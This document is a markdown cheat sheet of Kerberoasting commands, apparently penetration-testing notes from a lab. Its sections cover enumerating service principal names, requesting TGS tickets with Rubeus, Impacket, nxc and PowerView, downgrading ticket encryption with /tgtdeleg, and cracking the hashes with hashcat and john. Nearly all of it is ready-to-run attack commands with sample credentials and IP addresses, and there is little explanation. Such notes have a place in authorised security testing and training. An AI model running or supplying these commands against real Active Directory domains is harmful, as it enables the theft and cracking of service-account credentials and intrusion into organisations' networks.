- [ ] SPNs Enumeration
- [ ] TGS Request
- [ ] Algrorithm Downgrade
- [ ] Cracking

SPNs Enumeration!!!
```sh
# nxc
nxc ldap 192.168.0.104 -u harry -p pass --kerberoasting output.txt
# Powerview
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat 
# PywerView
pywerview get-netuser  -w ILF.local -u jmarston -p 'P@ssword!' -t 10.129.43.20 --spn
# GetUserSPNs.py | Impacket
impacket-GetUserSPNs INLANEFREIGHT.LOCAL/forend:Klmcargo2
# Rubeus
.\Rubeus.exe kerberoast /stats
```
TGS Request!!!
```sh
# Rubeus
Rubeus.exe kerberoast /simple /nowrap
# GetUserSPNs.py | Impacket
GetUserSPNs.py 'domain.local/fakeuser:fakapassword' -request-user userwithspn
# nxc - kerberoating with valid user
nxc ldap 192.168.0.104 -u harry -p pass --kerberoasting output.txt
# nxc - Kerberoasting via AS-REP Roasting
nxc ldap 192.168.0.104 -u harry -p '' --no-preauth-targets kerberoastable.list --kerberoasting output.txt
```
Algrorithm Downgrade!!!
```powershell
# Check TGS Encryption requirements | Powerview
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
# Encryption Downgrade with /tgtdeleg
.\Rubeus.exe kerberoast /tgtdeleg /user:testspn /nowrap

NB: The downgrade is only possible on Domain Controllers running on Server 2016 or earlier...
```
Cracking!!!
```sh
hashcat -m 13100 -a 0 tgs.txt rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt tgs.txt
john tgs.txt
```
